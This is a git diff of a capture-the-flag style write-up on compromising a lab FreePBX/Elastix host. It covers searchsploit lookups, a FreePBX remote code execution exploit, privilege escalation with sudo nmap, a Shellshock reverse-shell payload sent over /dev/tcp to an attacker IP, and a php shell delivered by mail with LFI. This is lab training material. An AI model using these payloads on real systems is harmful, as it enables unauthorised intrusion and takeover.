@@ -11,8 +11,8 @@
 ![b2](https://user-images.githubusercontent.com/15195048/93913788-6f524280-fcba-11ea-8e5c-9c03c465480e.png)
 
 
-3. Searchploit
-searchploit FREEpbx, Elastix
+**3. Searchsploit**
+searchsploit FREEpbx, Elastix
 
 ![b3](https://user-images.githubusercontent.com/15195048/93913790-6fead900-fcba-11ea-98d1-53d8796cbb71.png)
 
@@ -122,33 +122,33 @@ urllib.urlopen(url)
 # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Modifications: rhost, lhost, lport, extension.!!!!!
+**Modifications:** rhost, lhost, lport, extension.!!!!!
 
 Finding SIP extension:
 (example: external calls, 0 extension)
 
-SIPVicious tool Installation: 
+**SIPVicious tool** Installation: 
 Kali install:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 apt-get install sipvicious
-
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 General install:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 git clone https://github.com/EnableSecurity/sipvicious.git
 python3 setup.py install
-
 sipvicious_svmap -h
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-
-
-#1 Exploit  FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution, asterisk user: 
-python 18650.py
+## 1 Exploit  FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution, asterisk user: 
+**python 18650.py**
 
 
 Error: ssl certificate. After searching in google:
 If you just want to bypass verification, you can create a new SSLContext. By default newly created contexts use CERT_NONE.
 
-Modify the exploit:
+**Modifications:**
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 import urllib2
 import ssl
 
@@ -158,22 +158,22 @@ ctx.verify_mode = ssl.CERT_NONE
 
 urllib2.urlopen("https://your-test-server.local", context=ctx)
 
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Resource:https://stackoverflow.com/questions/19268548/python-ignore-certificate-validation-urllib2
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 sudo -l
 nmap --interactive
 sudo -l 
 sudo nmap --interactive
 !sh
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 I tried several python libraries and funtions in order to ignore and bypass ssl Certificate but with no luck! Some people say that the synchronization of time could be helpful but this is not possible due to our vpn connection!
 
-Solution: Pass the requests through BurpSUITE
-Notes:
- curl, dirb έχουν -k #ignore certificates
- 
+**Solution: Pass the requests through BurpSUITE**
+**Notes:**
+curl, dirb έχουν -k #ignore certificates
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 import requests
 rhost="10.10.10.7"
 lhost="10.10.14.9"
@@ -184,7 +184,7 @@ url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 r = requests.get(url, proxies=proxies, verify=False)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
 
@@ -196,7 +196,7 @@ nc -lvp 8888
 
 
 
-#2 Second Exploit, asterisk user: 
+## 2 Second Exploit, asterisk user: 
 Dirb results showed the following url path:
 https://10.10.10.7/vtigercrm/
 
@@ -222,11 +222,11 @@ admin:jEhdIekWmdjE
 
 ## 3. Enumerating port 10000
 
-  Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely.
+Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely.
   
-searchsploit webmin
+**searchsploit webmin**
   
-Shellshock explanation
+## Shellshock explanation
 
 
 
@@ -235,23 +235,23 @@ Shellshock explanation
 
 
 
-In the url session_login.cgi
-Test shellshock cgi...
-() { :; }; sleep 11
+**In the url session_login.cgi**
+**Test shellshock cgi...**
+**() { :; }; sleep 11**
 
-Burp Suite
+**Burp Suite**
 
 
-() { :; }; bash -i &> /dev/tcp/10.10.14.12/9980 0>&1
+**() { :; }; bash -i &> /dev/tcp/10.10.14.12/9980 0>&1**
 
 
 ## 4. Enumerating port 25 SMTP 
 
 I will send a malicious e-mail and got a reverse shell.
 
-telnet 10.10.10.7 25 it works so.
+**telnet 10.10.10.7 25 it works so.**
 
-Keywords: “EHLO Host”, “VRFY user” “mail from:” "rcpt tp:"
+**Keywords:** “EHLO Host”, “VRFY user” “mail from:” "rcpt tp:"
 
 We sent a php shell code within the mail. Lets try to execute the payload with LFI vulnerability. We can found our sent e-mail in 
 /var/mail/asterisk location. 
